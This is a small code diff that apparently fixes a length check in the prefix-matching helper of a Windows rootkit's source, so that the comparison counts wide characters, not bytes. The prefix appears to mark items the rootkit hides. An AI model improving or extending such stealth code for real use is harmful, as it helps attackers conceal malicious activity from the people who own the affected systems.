@@ -58,5 +58,5 @@ bool Rootkit::HasPrefix(LPCWSTR str)
 }
 bool Rootkit::HasPrefix(UNICODE_STRING str)
 {
-	return str.Buffer && str.Length >= HIDE_PREFIX_LENGTH && !_wcsnicmp(str.Buffer, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
+	return str.Buffer && str.Length / sizeof(WCHAR) >= HIDE_PREFIX_LENGTH && !_wcsnicmp(str.Buffer, HIDE_PREFIX, HIDE_PREFIX_LENGTH);
 }
